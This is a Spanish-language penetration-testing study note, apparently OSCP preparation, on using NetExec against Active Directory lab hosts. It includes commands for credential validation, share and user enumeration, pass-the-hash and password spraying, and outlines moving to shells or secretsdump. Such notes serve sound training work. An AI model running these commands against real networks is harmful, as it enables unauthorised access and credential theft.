# 🧰 NetExec (nxc) — Barrido y validación en AD/SMB

> Sucesor de **CrackMapExec**. Valida credenciales y enumera servicios (SMB, WinRM,
> LDAP, MSSQL, RDP...) contra uno o muchos hosts a la vez. El "¿esta llave abre?" rápido.
> Comandos: `netexec`, `nxc` o `crackmapexec` (según versión). Relacionado: [[impacket]]
> Relacionado: [[../AD/kerberoasting]] · [[../AD/asrep-roasting]] · [[../AD/acl-abuse]]

---

## Idea central
Le das una credencial y un protocolo, y te dice **si funciona** y **qué puedes hacer**.
El `[+]` = válidas · el `(Pwn3d!)` = acceso administrativo (eres admin en esa máquina).

## Sintaxis base
```
netexec <protocolo> <IP/rango> -u <user> -p <pass>
```
Protocolos: `smb`, `winrm`, `ldap`, `mssql`, `rdp`, `ssh`, `ftp`, `wmi`, `nfs`, `vnc`.

## Validar una credencial (el "login" de AD)
```bash
netexec smb 192.168.10.10 -u piotr.wisniewski -p 'Autumn2024!'
# [+] nordwind.local\piotr.wisniewski:Autumn2024!      ← válidas
```
De regalo te da recon del host: SO, build, nombre, dominio, SMB signing, null auth.

## ¿Soy admin? → el (Pwn3d!)
```bash
netexec smb 192.168.10.10 -u robert.dabrowski -p 'NewPass123!'
# [+] ...:NewPass123! (Pwn3d!)      ← (Pwn3d!) = admin en la máquina
```
Mismo truco con `winrm` para saber si puedes consola remota (evil-winrm):
```bash
netexec winrm 192.168.10.10 -u piotr.wisniewski -p 'Autumn2024!'
# sin (Pwn3d!)  → piotr NO tiene WinRM (es user normal)
```

## Enumeración útil (ya autenticado)
```bash
netexec smb 192.168.10.10 -u <u> -p <p> --shares     # carpetas compartidas + permisos
netexec smb 192.168.10.10 -u <u> -p <p> --users      # usuarios del dominio
netexec smb 192.168.10.10 -u <u> -p <p> --groups     # grupos
netexec smb 192.168.10.10 -u <u> -p <p> --pass-pol   # política de contraseñas
```

## Pass-the-Hash (sin pass en claro)
```bash
netexec smb 192.168.10.10 -u administrator -H <NTLM>   # -H en vez de -p
```

## Password spraying (una pass contra muchos users)
```bash
netexec smb 192.168.10.10 -u users.txt -p 'Primavera2024!' --continue-on-success
```
⚠️ OJO al **lockout**: a diferencia del roasting (offline), esto SÍ genera logins fallidos.

## Mental model OSCP
1. Crackeo/consigo una credencial (roasting, dump...).
2. `netexec smb ... ` → ¿válida? ¿`(Pwn3d!)`?
3. Si `(Pwn3d!)` → shell (psexec/wmiexec, ver [[impacket]]) o secretsdump.
4. Si no → enumero (`--shares`, `--users`) y busco el siguiente salto.
